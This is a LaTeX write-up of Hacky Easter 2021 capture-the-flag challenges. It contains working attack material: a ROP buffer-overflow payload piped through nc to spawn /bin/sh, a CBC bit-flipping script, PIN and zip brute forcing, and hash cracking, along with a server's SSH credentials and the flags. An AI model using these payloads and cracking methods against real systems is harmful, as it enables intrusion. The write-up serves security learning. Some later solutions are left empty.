\verb+2Qu93ZhJHdsMGIlhmcgUXagMWe19icmBGbnFiOoBTZwIjM7FGd0gHdfNTbuB2a5V2X1JzcuF3MzNQf==+
\verb+Q29uZ3JhdHMsIGhlcmUgaXMgeW91ciBmbGFnOiBoZTIwMjF7dGg0dHNfbTBua2V5X2J1czFuM3NzfQ==+

\hypertarget{he21.23}{%
  \section{HE21.23 Eggcryptor}
  \label{he21.23}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge23.jpg}
\end{marginfigure}

\noindent Eggcryptor is hiding something from you.

Crack it and get the Easter Egg!

\verb+eggcryptor.apk+ is provided.
\subsection{Show Hint (free)}
\begin{itemize}
\item You don't need to run the app. Just decompile and analyze it.
\end{itemize}


\hypertarget{he21.23-solution}{%
\subsection{HE21.23 Solution}\label{he21.23-solution}}

\noindent The apk can be analysed using a decompiler, we used \verb+jadx-ui+.
What the program does does:

\begin{itemize} 

    \item There is in entry form to get a PIN, this PIN has to match a regular
        expression of \verb+[a-z][0-9]{4}+

    \item There is a raw, base64 encoded secret stored as raw.raw.

    \item The PIN and the raw data are passed to a crypto function, that does
        an AES decryption.

    \item If the PIN is correct, we get a picture of an egg.
\end{itemize}

So we can write a brute forcer for the 26*10'000 possible PINs, using the recovered java source code.

\begin{minted}{java}

package com.company;

import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.regex.Pattern;
import java.util.Base64;

public class Main {
    final static String alph = "abcdefghijklmnopqrstuvwxyz";
    final static String num  = "0123456789";
    public static void main(String[] args) throws IOException {
        final Pattern p = Pattern.compile("[a-z][0-9]{4}");
        final String filePath = "raw.txt";
        String r;
        r = new String(Files.readAllBytes( Paths.get(filePath) ));
        final byte[] raw = Base64.getDecoder().decode(r);
        FileWriter myWriter = new FileWriter("output.txt");

        for (int ia = 0 ; ia < 26 ; ia++ ) {
            for (int i1 = 0 ; i1 < 10 ; i1++ ) {
                String t1 = "" + alph.charAt(ia) + num.charAt(i1);
                for (int i2 = 0 ; i2 < 10 ; i2++ ) {
                    String t2 = t1 + num.charAt(i2);
                    System.out.println(t2);
                    for (int i3 = 0; i3 < 10; i3++) {
                        String t3 = t2 + num.charAt(i3);
                        for (int i4 = 0; i4 < 10; i4++) {
                            String pin = t3 + num.charAt(i4);
                            if (p.matcher(pin).matches()) {
                                //byte[] d = new byte[0];
                                try {
                                    byte[] d = Crypto.decrypt(pin, r);
                                    myWriter.write(pin + ": ");
                                    myWriter.write(d[1]);
                                    myWriter.write(d[2]);
                                    myWriter.write(d[3]);
                                    myWriter.write("\n"); //, d[2], d[3]);
                                    if( d[1] == 'P' && d[2] == 'N' && d[3] == 'G') {
                                        System.out.println("Found solution for PIN " + pin);
                                        try (FileOutputStream stream = new FileOutputStream(pin + ".png")) {
                                            stream.write(d);
                                        }
                                    }
                                } catch (Exception e) {
                                    //pass; //e.printStackTrace();
                                }
                            } else {
                                System.out.println("String " + pin + " does not match pattern!");
                            }
                        }
                    }
                }
            }
        }
    }
}
\end{minted}

% <string name="egg">NB2HI4DTHIXS653XO4XHS33VOR2WEZJOMNXW2L3XMF2GG2B7OY6XKYRYGJMGEMKDHBXXG===</string>

% <string name="pattern">[a-z][0-9]{4}</string>
For the PIN \verb+g0717+ we get the egg 
\begin{marginfigure}
    \includegraphics[width=50mm]{ch23/solution23.png}
\end{marginfigure}

... and the flag is \verb+he2021{th3r3s_4_h4ck_4_th4t}+

\subsection{Sidenotes}

Within the apk is also a resource named "egg" that is
base32 encoded and when decoded gives
\url{https://www.youtube.com/watch?v=ub82Xb1C8os}.  But by now we know better
than to click on the link...

Within the Crypto class, there is a class variable named "EGG" with contents
that are repeatedly base64 encoded from the original string "nope".  So another
loose end tied up.

\hypertarget{he21.24}{%
  \section{HE21.24 Taco Cat}
  \label{he21.24}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge24.jpg}
\end{marginfigure}

\noindent Was it a cat I saw?

file \verb+tacocat.zip+ provided.

\subsection{Show Hint (free)}
\begin{itemize}
\item lowercase
\end{itemize}

\hypertarget{he21.24-solution}{%
\subsection{HE21.24 Solution}\label{he21.24-solution}}

\noindent The zip-file is password protected.  Everything in the description
and in the hits points towards an anagram password in lower case.  Cracking
zips can be done using John the Ripper, but we need a good list of passwords.
So generate a short program to dump the anagrams up to 9 letters into a file
start cracking.  First use \verb+zip2john+ to generate the proper input file,
and then run john:

\begin{verbatim} 
.\john.exe --wordlist=..\..\level4.txt ..\..\tacocat.hash
\end{verbatim}

This yields the password \verb+mousesuom+ to open the zip and extract the file
\verb+eggge.png+ with the flag \verb+he2021{!y0.ban4na.b0y!}+.

\begin{marginfigure}
    \includegraphics[width=50mm]{ch24/eggge.png}
\end{marginfigure}

\hypertarget{he21.25}{%
  \section{HE21.25 Lots of JWTs}
  \label{he21.25}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge25.jpg}
\end{marginfigure}

\noindent So many JWTs! What do they hide?

file \verb+jwts.txt+ provided.

\subsection{Show Hint (free)}
\begin{itemize}
\item You better write a script.
\end{itemize}

\hypertarget{he21.25-solution}{%
\subsection{HE21.25 Solution}\label{he21.25-solution}}

\noindent The file contains a jwt that, when expanded, consists again of
several jwts.  Use python to expand them all until we reach the bottom and then
printing the content gives us a list of fragments:

\begin{verbatim}
f_js0
n_t0k
nty_0
he202
1{pl3
k3nZ}
\end{verbatim}

With a bit of imagination these fragments can be combined into
\verb+he2021{pl3nty_0f_js0n_t0kk3nZ}+

\hypertarget{he21.26}{%
  \section{HE21.26 Lost}
  \label{he21.26}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge26.jpg}
\end{marginfigure}

\noindent One of the flags accidentally fell into the pot with the rejected ones!

Can you recover the lost flag?

file \verb+lost.pdf+ provided.

\subsection{Show Hint (free)}
\begin{itemize}
\item 23
\end{itemize}

\hypertarget{he21.26-solution}{%
\subsection{HE21.26 Solution}\label{he21.26-solution}}

\noindent Look at the pdf using \verb+binwalk+ to find the uncompressed content
of the PDF.  Within there are 500 lines with flags, so we have to try them
manually or find a way to submit them automatically.  After struggling to find
a way using python and the request library, we found it easier to rip out the
function submit flag and abuse it.  This runs quickly and finds the flag
\verb+{flag: "he2021{3t5Kc-PiP6Z-9xa2f-RNJrY-auDng}"}+.

\begin{minted}{js}
var arr = [
"he2021{4MG5D-A2BSg-0ohGW-aCRKT-XNzkS}",
...
"he2021{hZjl3-pE1wv-IJIyV-Gl8nt-jqavv}"
];

function submit(flagText) {
    const requestOptions = {
      method: 'POST',
      mode: 'cors',
      cache: 'no-cache',
      credentials: 'include',
      headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
      body: JSON.stringify({ flag: flagText })
    };
    fetch('https://21.hackyeaster.com/rest/user/challenge/26/checkflag', requestOptions)
      .then(response => response.json())
      .then(data => {
        // check result
        if (data && data.solveStatus) {
          if (data.solveStatus === 'CORRECT') {
              console.log(flagText);
              return true;
          }
          return false;
        }
      })
      .catch((err) => {
        window.location.href = config.AUTH_URL;
        return false;
      });
}

    for(p in arr) {
        if (submit(arr[p])) {
            console.log(arr[p]);
            break;
        }
    }
\end{minted} 

\hypertarget{he21.27}{%
  \section{HE21.27 Ghost in a Shell 2}
  \label{he21.27}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge27.jpg}
\end{marginfigure}

\begin{verbatim} 
  _, _,_  _,  _, ___   _ _, _    _,    _, _,_ __, _,  _,    ,  ,  
 / _ |_| / \ (_   |    | |\ |   /_\   (_  |_| |_  |   |     |  |  
 \ / | | \ / , )  |    | | \|   | |   , ) | | |   | , | ,   |  |  
  ~  ~ ~  ~   ~   ~    ~ ~  ~   ~ ~    ~  ~ ~ ~~~ ~~~ ~~~   ~  ~  
______________________________________________________________________  
 ,--.     ,--.    
| oo |   | oo |   
| ~~ |   | ~~ |   o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  
|/\/\|   |/\/\|     
______________________________________________________________________  
\end{verbatim} 

\noindent Connect to the server, snoop around, and find the flag!

\verb+ssh 46.101.107.117 -p 2108 -l clyde+
password is: \verb+555-ClYdE+
Note: The service is restarted every hour at x:00.fell into the pot with the rejected ones!

\hypertarget{he21.27-solution}{%
\subsection{HE21.27 Solution}\label{he21.27-solution}}

\noindent When we log in, we see only one file, \verb+flag?.txt+, the ASCII version of Rick-rolling.  In \verb$.lost+found$ is also a file, but it is write protected.

\begin{verbatim}
476859378aa9:~/.lost+found$ ls -l
total 4
-r--r-----    1 root     pacman          32 Apr  5 19:00 flag.txt
476859378aa9:~$ cd /home/pacman
476859378aa9:/home/pacman$ ls -la
total 28
drwxr-xr-x    1 root     root          4096 Apr  5 19:00 .
-rwxr-xr-x    1 root     root             9 Apr  5 19:00 ."\?$*'N'*$?\"
drwxr-xr-x    1 root     root          4096 Apr  3 05:23 ..
-rwxr-xr-x    1 root     root           312 Mar  2 12:05 .bash_history
-rwxr-xr-x    1 root     root           277 Mar  2 12:05 notes.txt
476859378aa9:/home/pacman$ cat .\"*
msPACM4n
476859378aa9:/home/pacman$ cat .bash_history
history -c
whoami
ls -lrt
cd /home/pacman
du -sh
vi notes.txt
clear
cd /var/log
passwd
ls
clear
cd ~
vi notes.txt
man cat
man unzip
man sg
find . -type f
find . -type f | grep mp4
find . -type f | grep mp4 | sort
clear
cd ~
ps -ef | grep java
kill 1236
killall java
reboot
ls -lrt
rm -rf /home/pacman/secret
exit
476859378aa9:/home/pacman$ cat notes.txt


░█▀▀ ░█▀█ ░█ ░█▀▀ ░░█▀▀ ░█▀█ ░█ ░█
░█▀▀ ░█▀▀ ░█ ░█ ░░░░█▀▀ ░█▀█ ░█ ░█
░▀▀▀ ░▀ ░░░▀ ░▀▀▀ ░░▀ ░░░▀░▀ ░▀ ░▀▀▀


476859378aa9:/home/pacman$ 
\end{verbatim} 

The first file \verb+"\?$*'N'*$?\"+ contains something that looks like a
password: \verb+msPACM4n+

Combining the history file, we see that the command \verb+sg+ was used and it
would execute a command within another group.  The flag is owned by
\verb+pacman+ and so we try if works with the given password:

\begin{verbatim} 
f9bc7196c810:~$ sg pacman "cat .lost\+found/flag.txt "
Password:
he2021{wh4ts_y0ur_grewp_4g4in?}
f9bc7196c810:~$
\end{verbatim} 

\hypertarget{he21.28}{%
  \section{HE21.28 Haxxor what 2?}
  \label{he21.28}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge28.jpg}
\end{marginfigure}

\noindent I was able to break the first file, but I'm stuck at this one.

Help!

file \verb+haxxorwhat2+ provided.

\subsection{Show Hint (free)}
\begin{itemize}
\item This time, the file is not an image.
\end{itemize}

\hypertarget{he21.28-solution}{%
\subsection{HE21.28 Solution}\label{he21.28-solution}}

\noindent From the name of the challenge we assumed that it is again an xor
encryption.  And from the hint, since it is not an image file, it probably is
something like a zip-file.  So try to xor the first four bytes with the magic
number for zip files \verb+0x50 4B 03 04+ using Cyber Chef.  The result is
encouraging with \verb+xorl+.  So zip is a good guess.  Let's see if we find
the end of directory record at the end of the file.  And yes, we see the
tell-tale \verb+PK+ there as well.  By extending the xor-key, we can figure out
that the xor-key has to be a multiple of 8 characters long -- otherwise the end
of record loses the \verb+PK+.

Using the specification and looking at the end of file directory entries, we
can find the values for the last three bytes (they must all be zero).  So we
end up with \verb+xorl.tan+, only one letter missing.  Opening the decoded
zip-file, we see a funny file name for a file that must be called
\verb+egg.png+, so finally we have the complete key \verb+xorlatan+. Extracting
the zip gives us the egg with the flag \verb+he2021{ul1m4te_x0r_m4st3r}+.

\begin{marginfigure}
    \includegraphics[width=50mm]{ch28/egg.png}
\end{marginfigure}


\hypertarget{he21.29}{%
\section{HE21.29 Sailor's Knot}
  \label{he21.29}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge29.jpg}
\end{marginfigure}

\noindent There is a huge variety of sailor's knots, but the common thing is they all use rops
or other types of cords.

\verb+nc 46.101.107.117 2112+

Get a shell and read the flag.

Note: The service is restarted every hour at x:00

file \verb+sailorsknot+ provided.

\subsection{Show Hint (free)}
\begin{itemize}
\item Ubuntu 18.04 64 Bit
\end{itemize}

\hypertarget{he21.29-solution}{%
\subsection{HE21.29 Solution}\label{he21.29-solution}}

\noindent Disassembly of the main function looks the same as in
Challenge~\ref{he21.16}.  So we can again overflow a string to jump anywhere in
the binary.  The function \verb+profit()+ is missing though.  On the other
hand, there is a strange function \verb+remove_me_before_deploy()+ that is
followed by some junk.  Disassembling the junk shows that there is one part
that calls \verb+system("/bin/ls")+, so this should give us at least something
to work with.

\begin{figure}
    \includegraphics[width=150mm]{ch29/remove_me_before_deploy.png}
\end{figure}

\begin{verbatim}
$ printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE\xc5\x07\x40\x00\x00\x00\x00\x00\nls -l\n" | nc
 46.101.107.117 2112
Welcome! Please give me your name!
> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE@, nice to meet you!
challenge2
flag
ynetd
\end{verbatim} 

So we get the listing and see that there is a file names \verb+flag+.  Again,
we have to find a way to print the flag.

Looking again at the junk after \verb+remove_me_before_deploy()+, we seen that
there is a \verb+POP RDI+ that we can use to load \verb+RDI+ from the stack and
if we jump directly to \verb+system+ further below, we can execute this
function with a string that we control.  So we have to build up a stack that
matches this requirement.

Further search in the binary finds a string that can be of use: 
\verb+Please ensure you remove _all_ references to the /bin/sh+.  This is a handy argument for our exploit.  So what we do:

\begin{itemize}
\item overflow the buffer with 40 characters
\item add the address 0x4007bf to jump to the code to load RDI
\item add the address 0x6010b1 -- the address of \verb+/bin/sh+
\item add the address 0x4007cc -- the address of the call to \verb+system+
\end{itemize}

This gives us the shell:
\begin{verbatim}
$ printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE\xbf\x07\x40\x00\x00  \
    \x00\x00\x00\xb1\x10\x60\0\0\0\x00\x00\xcc\x07\x40\0\0\0\0\0\nls\n  \
    cat flag\n">payload
$ nc 46.101.107.117 2112 < payload
Welcome! Please give me your name!
> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE@, nice to meet you!
challenge2
flag
ynetd
he2021{s41l0r_r0p_f0r_pr0f1t}
\end{verbatim}

... and now we also understand that the rops are not a typo!


\hypertarget{he21.30}{%
\section{HE21.30 Pix FX}
  \label{he21.30}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge30.jpg}
\end{marginfigure}

\noindent Hey there! We have our fancy new Pix FX service online!

\noindent Try it out!

\url{http://46.101.107.117:2110}

Note: The service is restarted every hour at x:00

\subsection{Show Hint (free)}
\begin{itemize}
\item egg
\end{itemize}

\hypertarget{he21.30-solution}{%
\subsection{HE21.30 Solution}\label{he21.30-solution}}

\noindent The web application lets us select a subject for the picture and add
an effect to it.  This generates a code that can be used to display the image.
There are also some predefined codes to look at and one of them shows a
chocolatized egg.  This is probably what we want to get, just with the least
distoring effect.  Unfortunately, we cannot select an egg.

Looking at the source code of the page, we see that the code is generated by
POSTing two parameters, image and effect.  Requesting a code for image=egg and
effect=3 (sepia) is rejected.

Fetching 10000 codes for the same picture shows that all are different.

So try to see what happens if we flip one bit of the code at a time using
Postman.  Some changes are outright rejected, but this looks interesting:

\begin{minted}{html}
<div class="centerbox-outer">
    <div class="centerbox-inner">
        <h2>Error!</h2>
        <span>Unknown field &#39;imafe&#39;</span>
    </div>
</div>
\end{minted}

This looks like the error message from a JSON decoder, expecting a key
\verb+'image'+ but getting \verb+'imafe'+ instead.  We seem to have flipped one
character only and so we probably can try to recover the rest.  By varying the
code at the first 16 bytes and observing the error messages, we learn that the
code starts with \verb+{'image': 'egg', + (the quotes are assumed to be single
quotes, but could also be double quotes).

Further tinkering past byte 16 leads to no more insights, but only shows two types of error
messages: \verb+Parser Error+ or \verb+Decryption Error+.  There is also a hint
with "chaining" as the subject of an image, that points us towards cipher
buffer chaining.  With an padding oracle attack it should be possible to decode
at least the last buffer, maybe more but this is dependent on the decryption
function used in the CBC.  So try a padding oracle attack on the egg-code and
it works:  we get \verb+ "effect": 4}+ as the second part of the code.

Now we have the complete code with \verb+{"image": "egg", "effect": 4}+. Effect
4 is chocolatize and we probably want sepia for the egg to make it readable.
So we have to construct a valid code for effect 3.  This can be done again
using a padding attack.  It turns out though, that flipping the effect to
sepia, destroys the rest of the code because of the decryption function.  So we
have to try another way: the first block of the code can be manipulated
directly by changing the first block, so change the file name to \verb+egg+ in
a sepia picture.  Tony the pony works, since it just fits into the first block.
So create the block and submit to get the egg:

\begin{minted}{python}
def setSubject(code, index, now, should, url):
    codes = []
    for i in range(2*BLOCKLEN):
        codes.append(int(code[2*i:2*i+2], 16))

    prefix    = code[:2*index]
    tail      = code[2*index+2*len(now):]
    newCrypt = ''
    for i in range(len(now)):
        tmp = codes[i+index] ^ ord(now[i]) ^ ord(should[i])
        newCrypt  += '{:02X}'.format(tmp)
    session = requests.session()
    newCode = prefix + newCrypt + tail
    r = session.get(url + newCode)
    if decodeStatus(r) == 'ImageFound':
        print(newCode)
        return  newCode
    else:
        print(decodeStatus(r))

setSubject(pony, 11, 'pony"', 'egg" ', code_url)
\end{minted}

\begin{marginfigure}
    \includegraphics[width=50mm]{ch30/egg.png}
\end{marginfigure}
 
The flag is \verb+he2021{fl1pp1n_da_b1ts_gr34t_succ355}+

References:
\begin{itemize}
\item \url{https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CBC}
\item \url{https://tlseminar.github.io/docs/Crypto101.pdf}
\end{itemize}

\hypertarget{he21.31}{%
\section{HE21.31 Hunny Bunny}
  \label{he21.31}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge31.jpg}
\end{marginfigure}

\noindent hunnybunny loves music! Can you figure out what else he loves?

\begin{verbatim}
4ab56415e91e6d5172ee79d9810e30be5da8af18
c19a3ca5251db76b221048ca0a445fc39ba576a0
fdb2c9cd51459c2cc38c92af472f3275f8a6b393
6d586747083fb6b20e099ba962a3f5f457cbaddb
5587adf42a547b141071cedc7f0347955516ae13
\end{verbatim}

⚑ format: \verb+he2021{lowercaseonlynospaces}+

\subsection{Show Hint (free)}
\begin{itemize}
\item The values can be cracked, but they need to be changed somehow first.
\item One of the values represents the flag prefix.
\end{itemize}

\hypertarget{he21.31-solution}{%
\subsection{HE21.31 Solution}\label{he21.31-solution}}

\noindent The lines look like SHA-1 hashes and the hint tells us that one of
them is the prefix of the flag.  So try out the hash of \verb+he2021{+ and
compare it to the given hashes.

The first one is very close

\begin{verbatim} 
input:   4ab56415e91e6d5172ee79d9810e30be5da8af18
he2021{: 4de56415b91b6a5172bb79a9810b30eb5ad8dc18
\end{verbatim} 

From comparison, we see that the characters have been exchanged, `a' with `d',
`b' with `e', and `c' with `f'.  So map the given strings using this rule and
use \verb+hashcat+ to crack the hashes.  From the flag-format, we can limit the
search to lower case letters only, except that for the last part we know that
it has to be terminated with a '\}'.  But first let's try if Crackstation finds
the hashes -- it does!

\begin{verbatim} 
4de56415b91b6a5172bb79a9810b30eb5ad8dc18:he2021{
f19d3fd5251ae76e221048fd0d445cf39ed576d0:hunnybunny
cae2f9fa51459f2ff38f92dc472c3275c8d6e393:ilovemum
6a586747083ce6e20b099ed962d3c5c457fedaae:somuch
5587dac42d547e141071fbaf7c0347955516db13:!}
\end{verbatim} 

The flag is \verb+he2021{hunnybunnyilovemumsomuch!}+

\hypertarget{he21.32}{%
\section{HE21.32 Two Yolks}
  \label{he21.32}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge32.jpg}
\end{marginfigure}

\noindent This egg has two yolks.

But the second seems to be hidden somehow.

File \verb+twoyolks.png+ provided.

\hypertarget{he21.32-solution}{%
\subsection{HE21.32 Solution}\label{he21.32-solution}}

\noindent First step is to analyse the file using binwalk; it reveals that
there are two image contents stored in the file and we probably only see the
first.  Have a look at the bitmaps extracted using \verb+binwalk -e+, we see
that they have both the same number of pixels (1025*1024).  This is consistent
with the size reported in the header of the file.

The first try: try to use \verb+dd+ to copy the second bitmap to the front and
show the image.  It shows then part of the QR-code, but in funky colours and
the bottom is blank.  So analyse the colour indexes used in the bitmaps and we
see that the second bitmap uses a range larger than the palette!  To see if it
contains all of the QR-code, print the bitmaps as ASCII, shifting the values up
by 32 to make them prinable.  It turns out, that the black parts of the QR-code
has all the same value and so we just turn this into a picture using PIL.

\begin{minted}{python}
import png
from PIL import Image

def hist(anArr):
    pal = {}
    for i in range(1025*1024):
        c = anArr[i]
        if c in pal:
            pal[c] += 1
        else:
            pal[c] = 1

    return pal


def saveAscii(fn, arr):
    with open(fn, 'w') as outF:
        for rows in range(1024):
            row = ''
            for cols in range(1, 1025):
                row += chr(arr[rows*1025+cols] + 32)
            outF.write(row + '\n')

with open('pic1', 'rb') as firstF:
    arr1 = firstF.read()
    pal1 = hist(arr1)

with open('pic2', 'rb') as firstF:
    arr2 = firstF.read()
    pal2 = hist(arr2)
    saveAscii('pic2.txt', arr2)

with open('twoyolks.png', 'rb') as pngF:
    r = png.Reader(pngF)
    (width, height, rows, info) = r.read()
    print(info)

print('number of colours in palette:', len(info['palette']))
print('colours used in picture 1:')
for k in sorted(pal1.keys()):
    print('key %d: %d' % (k, pal1[k]))
print('colours used in picture 2:')
for k in sorted(pal2.keys()):
    print('key %d: %d' % (k, pal2[k]))


qr = Image.new('1', (1024,1024))
for rows in range(1024):
    for cols in range(1, 1025):
        p = arr2[rows*1025+cols]
        if p == 15:
            qr.putpixel((cols-1, rows), 0)
        else:
            qr.putpixel((cols-1, rows), 1)
qr.save('qr.png')
\end{minted} 

\begin{marginfigure}
    \includegraphics[width=50mm]{ch32/qr.png}
\end{marginfigure}

The flag is \verb+he2021{tw0_y0lks_are_gre33eat}+

\hypertarget{he21.33}{%
\section{HE21.33 Finding Mnemo}
  \label{he21.33}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge33.jpg}
\end{marginfigure}

\noindent Dorie has forgotten everything again... Luckily, there is a backup:

\begin{verbatim} 
 adapt    3555  
 bind     824e  
 bless    8fcf  
 blind    81db  
 civil    03ec  
 craft    ed05  
 garage   9db4  
 good     d2ba  
 half     1272   
 hip      8d53  
 home     21b7  
 hotel    1cb0  
 lonely   e5b8  
 magnet   16b9  
 metal    770e  
 mushroom dd80  
 napkin   0829  
 reason   ecd3  
 rescue   5ef2  
 ring     e3b0  
 shift    4ea1  
 small    f1f6  
 sunset   b271  
 tongue   f08d  
\end{verbatim} 


\hypertarget{he21.33-solution}{%
\subsection{HE21.33 Solution}\label{he21.33-solution}}

\noindent 

\hypertarget{he21.34}{%
\section{HE21.34 The Five Seasons}
  \label{he21.34}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge34.jpg}
\end{marginfigure}

\noindent Did you know there were five seasons?

Find the flag file!

http://46.101.107.117:2111

Note: The service is restarted every hour at x:00.
\subsection{Show Hint}
The 🐟is just a trap 😼

A hint is hiding in one of the poems.

\hypertarget{he21.34-solution}{%
\subsection{HE21.34 Solution}\label{he21.34-solution}}

\noindent 


\hypertarget{he21.35}{%
\section{HE21.35 The Snake}
  \label{he21.35}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge35.jpg}
\end{marginfigure}

\noindent Cunning snake has a little riddle for you:

\verb+21{_inake0dltn_2olospena__iht_fthet!}+

\subsection{Show Hint}
It's a self-made algorithm, not one you'll find in the web.
Look at the snake in the title image.


\hypertarget{he21.35-solution}{%
\subsection{HE21.35 Solution}\label{he21.35-solution}}

\noindent This is an anagram to be solved; play around with the words to find
\verb+he2021{dont_fall_into_the_snake_pit!}+


\hypertarget{he21.36}{%
\section{HE21.36 Doldrums}
  \label{he21.36}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge36.jpg}
\end{marginfigure}

\noindent Without wind, no ship can sail.

This one is really secure. I promise!

nc 46.101.107.117 2113

Get a shell and read the flag.

Note: The service is restarted every hour at x:00.

File \verb+doldrums+ is provided.

\subsection{Show Hint}
Ubuntu 18.04 64 Bit

\hypertarget{he21.36-solution}{%
\subsection{HE21.36 Solution}\label{he21.36-solution}}

\noindent 

\end{document}

